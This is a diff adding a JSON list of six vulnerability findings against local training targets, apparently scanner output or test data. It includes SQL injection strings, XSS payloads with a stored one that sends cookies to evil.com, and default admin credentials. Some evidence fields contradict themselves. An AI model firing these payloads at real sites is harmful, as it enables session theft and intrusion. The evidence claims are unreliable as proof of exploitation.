@@ -1,0 +1,56 @@
+[
+  {
+    "type": "SQLi",
+    "url": "http://localhost/vulnerabilities/sqli/",
+    "parameter": "id",
+    "payload": "1' OR '1'='1' -- ",
+    "evidence": "MySQL error: You have an error in your SQL syntax near ''1'='1'' — full database dump extracted via UNION SELECT",
+    "severity": "Critical",
+    "timestamp": "2025-06-01T14:32:00Z"
+  },
+  {
+    "type": "SQLi",
+    "url": "http://localhost/vulnerabilities/sqli_blind/",
+    "parameter": "id",
+    "payload": "1' AND SLEEP(5) -- ",
+    "evidence": "Response delayed by 5.2 seconds (baseline: 0.3s) — time-based blind SQLi confirmed. Extracted admin password hash: $2y$10$...",
+    "severity": "Critical",
+    "timestamp": "2025-06-01T14:42:30Z"
+  },
+  {
+    "type": "XSS",
+    "url": "http://localhost/vulnerabilities/xss_r/",
+    "parameter": "name",
+    "payload": "<script>alert('XSS')</script>",
+    "evidence": "Payload rendered unescaped in response body: <script>alert('XSS')</script> — DOM-based reflection confirmed",
+    "severity": "High",
+    "timestamp": "2025-06-01T14:35:12Z"
+  },
+  {
+    "type": "XSS",
+    "url": "http://localhost/vulnerabilities/xss_s/",
+    "parameter": "message",
+    "payload": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>",
+    "evidence": "Stored XSS payload persisted in database, executed for all users viewing the guestbook page. Session cookies successfully exfiltrated.",
+    "severity": "Critical",
+    "timestamp": "2025-06-01T14:37:00Z"
+  },
+  {
+    "type": "IDOR",
+    "url": "http://localhost:3000/api/Users/3",
+    "parameter": "userId",
+    "payload": "3",
+    "evidence": "Response 200 OK with full user profile JSON including email, phone, and hashed password (expected 403 Forbidden). Sequential enumeration confirmed access to 57 user records.",
+    "severity": "High",
+    "timestamp": "2025-06-01T14:38:45Z"
+  },
+  {
+    "type": "BrokenAuth",
+    "url": "http://localhost/login.php",
+    "parameter": "username/password",
+    "payload": "admin:password",
+    "evidence": "Default credentials accepted — full admin access granted immediately. Admin panel revealed 1,247 user records accessible without MFA.",
+    "severity": "Critical",
+    "timestamp": "2025-06-01T14:40:00Z"
+  }
+]
